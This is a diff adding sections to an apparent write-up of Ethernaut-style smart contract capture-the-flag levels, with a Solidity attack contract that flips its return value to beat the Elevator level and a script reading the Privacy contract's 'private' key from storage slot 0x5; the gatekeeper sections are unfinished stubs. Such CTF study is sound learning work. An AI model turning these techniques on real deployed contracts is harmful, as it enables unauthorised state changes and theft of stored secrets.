@@ -234,5 +234,80 @@ console.log(await ethers.provider.getBalance(reentrance.address));
 
 ---
 
+## elevator
+
+The goal is to reach the top, i.e. boolean value for `top` should be true. The only public function is `goTo`. The challenge also has an interface for Building. We need to deploy a Building contract which satisfies the conditions in the goTo and make us reach at the top. 
+
+There are 2 calls to building contract and an interesting thing to notice is that the call `isLastFloor` is a non-view call, meaning we change the state inside the Building contract between the two subsequent calls. This makes our life easy
+
+```solidity
+contract BuildingHack is Building {
+    bool step = false;
+    function isLastFloor(uint) external returns (bool) {
+        bool prevStep = step;
+        step = !prevStep;
+        return prevStep;
+    }
+
+    function goTo(address elevatorAddress) public {
+        Elevator elevator = Elevator(elevatorAddress);
+        elevator.goTo(0);
+    }
+}
+```
+
+```javascript
+const BuildingHack = await hre.ethers.getContractFactory("BuildingHack");
+const building = await BuildingHack.deploy();
+await building.deployed()
+
+console.log(`building deployed on ${building.address}`);
+
+const tx = await building.goTo(INSTANCE_ADDRESS);
+await tx.wait()
+console.log(await elevator.top());
+```
+
+---
+
+## privacy
+
+This challenge is very similar to the challenge **vault**. Only difference is, this challenge requires some knowledge of how evm packs data while storing and how an array is stored.
+
+[How to read Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)
+
+Let's go through the contract and how the data will be stored.
+
+```solidity
+bool public locked = true;
+uint256 public ID = block.timestamp;
+uint8 private flattening = 10;
+uint8 private denomination = 255;
+uint16 private awkwardness = uint16(block.timestamp);
+bytes32[3] private data;
+```
+
+- `locked` will be stored in the first slot `0x0`
+- `uint256` is 32 bytes and cannot be stored in the first slot so `ID` will take `0x1`
+- Next 3 variables are `uint8`, `uint8` and `uint16` respectively totalling upto 32 bytes. All these variables will be packed in slot `0x2` 
+- `data` is an array of bytes32 elements and will fill slot from `0x3` to `0x5`
+
+To unlock the contract we need to get the last element of data array which is stored in slot `0x5`, trim it to 16 bytes and trigger the `unlock`
+
+```javascript
+data = await ethers.provider.getStorageAt(INSTANCE_ADDRESS,"0x5","latest");
+```
+
+Rest I beleive is quite striaghtforward
+
+---
+
+## gatekeeperone
+
+This level is tricky, especially the gate number 1 and still wip. Will fill in the details later
+
+---
+
+## gatekeepertwo
 
 
